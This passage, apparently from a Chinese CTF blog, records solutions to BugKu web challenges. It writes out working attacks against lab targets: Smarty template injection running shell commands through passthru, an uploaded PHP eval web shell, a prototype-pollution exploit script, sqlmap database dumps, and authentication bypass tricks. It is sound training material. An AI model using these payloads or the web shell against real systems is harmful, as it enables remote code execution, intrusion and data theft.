src="https://s2.loli.net/2022/04/27/8DhOGmWrz93K6wd.png" alt="shell2.png"></p><h2 id="聪明的php"><a href="#聪明的php" class="headerlink" title="聪明的php"></a>聪明的php</h2><p>随意传参得到源码提示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> AS <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123;          </span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;./template.html&#x27;</span>);                 </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>可以看到system等命令已经被禁用了，故使用passthru来执行命令</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15783/index.php?a=&#123;passthru(%27ls%20-al%20/%27)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/wRp7dIuoJKUT8AE.png" alt="php1.png"></p><p>发现一个很可疑文件，去读取即可获得flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15783/index.php?a=&#123;passthru(%27tac%20/_7782%27)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/NYuIkAJXHZKewjq.png" alt="php2.png"></p><blockquote><p>有关程序执行可看此网站：<a href="https://www.php.net/exec">PHP程序执行</a></p><p>参考wp：<a href="https://zhuanlan.zhihu.com/p/401583380">BugKu-Web-wp1</a></p></blockquote><h2 id="xxx二手交易市场"><a href="#xxx二手交易市场" class="headerlink" title="xxx二手交易市场"></a>xxx二手交易市场</h2><p>看了一圈发现没什么东西，注册账号登录，发现可以上传头，故进行图片上传并抓包，发现图片是用base64编码的，故构造一句话木马传进去（注意使用base64编码，且前面的jpeg要改为php）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/m6kYFzCrnJpso98.png" alt="xxxx1.png"></p><p>用中国蚁剑连接传入php文件地址（密码为cmd），翻找后获得flag。</p><p><img src="https://s2.loli.net/2022/04/27/zIYa4Xc39OCHf7L.png" alt="xxxx2.png"></p><h2 id="闪电十六鞭"><a href="#闪电十六鞭" class="headerlink" title="闪电十六鞭"></a>闪电十六鞭</h2><p>打开网页即可获得源码，分析后构造payload即可获得flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17903/?flag=$a=%27flaa%27;$a&#123;3&#125;=%27g%27;?%3E%3C?=$$a;?%3Ebbbbbbbbbbbbbbbbbb</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/zra8M3yHTnWsIeo.png" alt="teacherma.png"></p><blockquote><p>参考wp：<a href="https://blog.csdn.net/weixin_58111246/article/details/123971455?spm=1001.2014.3001.5501">BugKu-Web-wp2</a></p></blockquote><h2 id="sodirty"><a href="#sodirty" class="headerlink" title="sodirty"></a>sodirty</h2><p>用御剑扫一遍发现<code>www.zip</code></p><p><img src="https://s2.loli.net/2022/04/27/Iv5dpC3bAocHKXt.png" alt="dirty1.png"></p><p>解压后，重点看routes下的index.js文件，其中，getflag是我们获取flag的地方</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/getflag&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">password</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">password</span> === req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">password</span>)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">age</span> &gt; <span class="number">79</span>)&#123;  <span class="comment">//  age&lt;=79</span></span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;糟老头子坏滴很&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">key</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Admin</span>[key] === password)&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">flag</span> ? process.<span class="property">env</span>.<span class="property">flag</span> : <span class="string">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;密码错误，请使用管理员用户名登录.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>update可以更新键值对，是我们主要要利用的函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/update&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span> === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/reg&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">attrkey</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">attrval</span> === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;传参有误&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">attrkey</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">let</span> value = req.<span class="property">body</span>.<span class="property">attrval</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="title function_">setFn</span>(req.<span class="property">session</span>.<span class="property">challenger</span>, key, value);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>故构造exp如下即可获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = requests.session()  <span class="comment">#要保持同一会话</span></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:19460&quot;</span></span><br><span class="line">reg = s.get(url+<span class="string">&#x27;/reg&#x27;</span>)</span><br><span class="line"><span class="comment"># print(reg.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;attrkey&#x27;</span>:<span class="string">&#x27;age&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;attrval&#x27;</span>:<span class="number">79</span></span><br><span class="line">&#125;</span><br><span class="line">update_age = s.post(url+<span class="string">&#x27;/update&#x27;</span>,data=data)</span><br><span class="line"><span class="comment"># print(update_age.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;attrkey&#x27;</span>:<span class="string">&#x27;__proto__.pwd&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;attrval&#x27;</span>:<span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line">update_info = s.post(url+<span class="string">&#x27;/update&#x27;</span>,data=data)</span><br><span class="line"><span class="comment"># print(update_info.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="number">123</span>,</span><br><span class="line"><span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;pwd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = s.post(url=url+<span class="string">&#x27;/getflag&#x27;</span>,data=data);</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://www.jianshu.com/p/2dbb1b38de1e">BugKu-Web-wp3</a></p></blockquote><h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>打开网页获得源码，本地分析</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// highlight_file(&#x27;2.php&#x27;);</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] = <span class="string">&#x27;keykeyaaaaakey:/a/keya.&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//  [[:punct:]]代表任何标点符号</span></span><br><span class="line"><span class="variable">$IM</span>= <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Fail!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload获取flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13051/?id=keykeyaaaaakey:/a/keya.</span><br></pre></td></tr></table></figure><blockquote><p>正则匹配规则：<a href="https://www.runoob.com/regexp/regexp-rule.html">正则表达式 - 匹配规则</a></p></blockquote><h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h2><p>查看网页源码发现code.txt，访问即可获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11845/?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[]=1</span><br></pre></td></tr></table></figure><h2 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h2><p>尝试注册admin用户提示用户名已经存在，故猜测管理员账号用户名为admin</p><p><img src="https://s2.loli.net/2022/04/27/M4C7zaomdrfwk1q.png" alt="login1_1.png"></p><p>经过尝试发现未对空格过滤，故创建一个用户名为<code>‘admin ’</code>（即admin+空格）的账户登录即可</p><p><img src="https://s2.loli.net/2022/04/27/F7qpLaQ3dwZK24T.png" alt="login1_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web 刷题记录2</title>
      <link href="/2022/04/25/BugKu-Web2/"/>
      <url>/2022/04/25/BugKu-Web2/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-刷题记录2"><a href="#BugKu-Web-刷题记录2" class="headerlink" title="BugKu Web 刷题记录2"></a>BugKu Web 刷题记录2</h1><blockquote><p>参考：</p><p><a href="https://www.secpulse.com/archives/137663.html">BugKu-Web-wp1</a></p><p><a href="https://www.secpulse.com/archives/140522.html">BugKu-Web-wp2</a></p><p><a href="https://blog.csdn.net/weixin_46578840/article/details/120140214?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&utm_relevant_index=4">get-shell-wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123962077">get-shell-wp2</a></p></blockquote><h2 id="成绩查询"><a href="#成绩查询" class="headerlink" title="成绩查询"></a>成绩查询</h2><p>使用sqlmap进行注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs</span><br></pre></td></tr></table></figure><p>发现爆出来四个数据库名字</p><p><img src="https://s2.loli.net/2022/04/25/E9fdTwOpDxB7Y4j.png" alt="score1.png"></p><p>其中skctf很可疑，去爆其中表名</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf --tables</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/ui3TogqRI6XrKp2.png" alt="score2.png"></p><p>可以猜测，flag就在f14g中，故去爆其中字段</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf -T fl4g --columns</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/h5S6VBsPbtJoIHz.png" alt="score3.png"></p><p>可以看到，fl4g表中有一个名为skctf_flag字段，得到其字段信息即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf -T fl4g -C skctf_flag --dump</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/oerldNR6xyZ2Qu9.png" alt="score4.png"></p><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p>打开网页后发现需要2秒内计算出结果返回，故编写脚本实现</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.175.224:13247/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sess = requests.Session() <span class="comment">#保持当前连接不断</span></span><br><span class="line">response = sess.post(url=url,headers=headers)  <span class="comment">#不要加cookie</span></span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#自动解码</span></span><br><span class="line">html_data = response.text</span><br><span class="line"><span class="comment"># print(html_data)</span></span><br><span class="line">data = re.findall(<span class="string">&#x27;&lt;div&gt;(.*)?=\?;&lt;/div&gt;&#x27;</span>,html_data)</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">ans = &#123;</span><br><span class="line"><span class="string">&#x27;value&#x27;</span>:<span class="built_in">eval</span>(data[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(ans[&#x27;value&#x27;])</span></span><br><span class="line">r = sess.post(url=url,data = ans)</span><br><span class="line">r.encoding = r.apparent_encoding <span class="comment">#自动解码</span></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/TEkaGxVD7lodf8O.png" alt="driver.png"></p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>查看源代码发现要传递margin字段</p><p><img src="https://s2.loli.net/2022/04/25/T3p4Eu2e5ryvVdG.png" alt="fast1.png"></p><p>使用burp抓包发现flag字段</p><p><img src="https://s2.loli.net/2022/04/25/1YRyBwiXnAOqzJv.png" alt="fast2.png"></p><p>然后编写脚本进行post请求传递margin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.175.224:16315/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sess = requests.Session() <span class="comment">#保持当前连接不断</span></span><br><span class="line">response = sess.get(url=url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#自动解码</span></span><br><span class="line">head = response.headers</span><br><span class="line"><span class="comment"># print(head[&#x27;flag&#x27;])</span></span><br><span class="line">flag = base64.b64decode(head[<span class="string">&quot;flag&quot;</span>])</span><br><span class="line">flag = flag.decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">payload = base64.b64decode(flag.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;margin&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = sess.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>脚本运行后即可获得flag</p><p><img src="https://s2.loli.net/2022/04/25/EfrAC3xY6w7ZqRm.png" alt="fast3.png"></p><h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>进入后发现url有line和filename两个参数</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10608/index.php?line=&amp;filename=a2V5cy50eHQ=</span><br></pre></td></tr></table></figure><p>base64解码<strong>a2V5cy50eHQ&#x3D;<strong>发现是</strong>keys.txt</strong>，故写脚本尝试读取index.php源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">str</span>(base64.b64encode(<span class="string">b&#x27;index.php&#x27;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#index.php的base64编码</span></span><br><span class="line"><span class="comment"># print(filename)</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">url = <span class="string">f&#x27;http://114.67.175.224:10608/index.php?line=<span class="subst">&#123;i&#125;</span>&amp;filename=<span class="subst">&#123;filename&#125;</span>&#x27;</span></span><br><span class="line"><span class="comment"># print(url)</span></span><br><span class="line">response = requests.get(url=url)</span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#自动解码</span></span><br><span class="line"><span class="keyword">if</span>(response.text==<span class="string">&#x27;&#x27;</span>):</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123; <span class="comment">//cookie字段中margin的值为margin</span></span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>编写exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">str</span>(base64.b64encode(<span class="string">b&#x27;keys.php&#x27;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#keys.php的base64编码</span></span><br><span class="line">url = <span class="string">f&#x27;http://114.67.175.224:10608/index.php?line=&amp;filename=<span class="subst">&#123;filename&#125;</span>&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;margin&quot;</span>:<span class="string">&quot;margin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>运行后即可得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$key</span>=<span class="string">&quot;flag&#123;99d5704e2ff0effef5f671361d5fe141&#125;&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h2><p>F12查看发现1p.html页面</p><p><img src="https://s2.loli.net/2022/04/25/9M8eHgKajVChkXu.png" alt="never1.png"></p><p>直接跳转发现会一直跳转到<a href="https://www.bugku.com/">BugKu</a>这个地址，故直接view-source查看源码</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">view-source:http://114.67.175.224:11348/1p.html</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/vO5dgTaExQKU27w.png" alt="never2.png"></p><p>输出NewWords得到解码后内容</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://www.bugku.com&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--&gt;</span></span><br></pre></td></tr></table></figure><p>发现注释里还有base64编码，故进行解码得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 